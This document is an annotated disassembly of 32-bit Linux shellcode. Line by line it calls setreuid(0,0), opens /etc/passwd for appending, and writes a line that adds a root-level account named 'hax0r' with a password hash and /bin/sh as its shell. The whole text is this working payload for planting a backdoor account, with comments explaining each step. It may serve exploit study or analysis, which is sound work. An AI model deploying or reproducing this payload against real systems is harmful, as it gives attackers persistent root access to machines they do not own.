00000000  31C9              xor ecx,ecx                  ; zero out counter register
00000002  89CB              mov ebx,ecx                  ; zero out base register
00000004  6A46              push byte +0x46              ; push 70 to the stack
00000006  58                pop eax                      ; store 70 in accumulator register
00000007  CD80              int 0x80                     ; execute int setreuid(EBX, ECX) where EBX=ruid and ECX=euid, hence calling process MUST be privileged
00000009  6A05              push byte +0x5               ; push 5 to the stack
0000000B  58                pop eax                      ; store 5 in accumulator register
0000000C  31C9              xor ecx,ecx                  ; zero out counter register
0000000E  51                push ecx                     ; push NULL terminator to the stack
0000000F  6873737764        push dword 0x64777373        ; push dwss to the stack
00000014  682F2F7061        push dword 0x61702f2f        ; push ap// to the stack
00000019  682F657463        push dword 0x6374652f        ; push cte/ to the stack, reading string backwards /etc//passwd
0000001E  89E3              mov ebx,esp                  ; move stack pointer to base register
00000020  41                inc ecx                      ; increment counter register by one, O_WRONLY octal=00000001
00000021  B504              mov ch,0x4                   ; move 4 to second byte of counter register, O_APPEND octal=00002000
00000023  CD80              int 0x80                     ; execute int open("/etc//passwd", O_WRONLY | O_APPEND, NULL)
00000025  93                xchg eax,ebx                 ; save file descriptor to base register for later use
00000026  E823000000        call dword 0x4e              ; unconditional jump to 0x804a08e <shellcode+78> ---------------+
;                                                                                                                        |
;                                                                                                                        |
; the following block translates to ("hax0r:AzEVb1JCPG1IQ:0:0::/:/bin/sh\nY\213Q\374j\004X̀j\001X̀") ----------------------------+
;                                                                                                                        |     |
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;                                                                |     |
0000002B  6861783072        push dword 0x72307861       ;                                                                |     |
00000030  3A417A            cmp al,[ecx+0x7a]           ;                                                                |     |
00000033  45                inc ebp                     ;                                                                |     |
00000034  56                push esi                    ;                                                                |     |
00000035  62                db 0x62                     ;                                                                |     |
00000036  314A43            xor [edx+0x43],ecx          ;                                                                |     |
00000039  50                push eax                    ;                                                                |     |
0000003A  47                inc edi                     ;                                                                |     |
0000003B  314951            xor [ecx+0x51],ecx          ;                                                                |     |
0000003E  3A30              cmp dh,[eax]                ;                                                                |     |
00000040  3A30              cmp dh,[eax]                ;                                                                |     |
00000042  3A3A              cmp bh,[edx]                ;                                                                |     |
00000044  2F                das                         ;                                                                |     |      
00000045  3A2F              cmp ch,[edi]                ;                                                                |     |
00000047  62696E            bound ebp,[ecx+0x6e]        ;                                                                |     |
0000004A  2F                das                         ;                                                                |     |
0000004B  7368              jnc 0xb5                    ;                                                                |     |
0000004D  0A598B            or bl,[ecx-0x75]            ;                                                                |     |
00000050  51                push ecx                    ;                                                                |     |       
00000051  FC                cld                         ;                                                                |     |
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;                                                                |     |
;                                                                                                                        |     |
;  +---------------------------------------------------------------------------------------------------------------------+     |                                                   
;  |                                                                                                                           |
;  +-----> ; 0x804a08e <shellcode+78>: pop ecx                     ; <---------------------------------------------------------+
;          ; 0x804a08f <shellcode+79>: mov edx,DWORD PTR [ecx-0x4] ; move # to data register
; 
00000052  6A04              push byte +0x4             ; push 4 to the stack
00000054  58                pop eax                    ; store 4 in accumulator register
00000055  CD80              int 0x80                   ; write "hax0r:AzEVb1JCPG1IQ:0:0::/:/bin/sh\nY\213Q\374j\004X̀j\001X̀" to /etc//passwd     
00000057  6A01              push byte +0x1             ; push 1 to the stack     
00000059  58                pop eax                    ; store 1 in accumulator register
0000005A  CD80              int 0x80                   ; exit gracefully

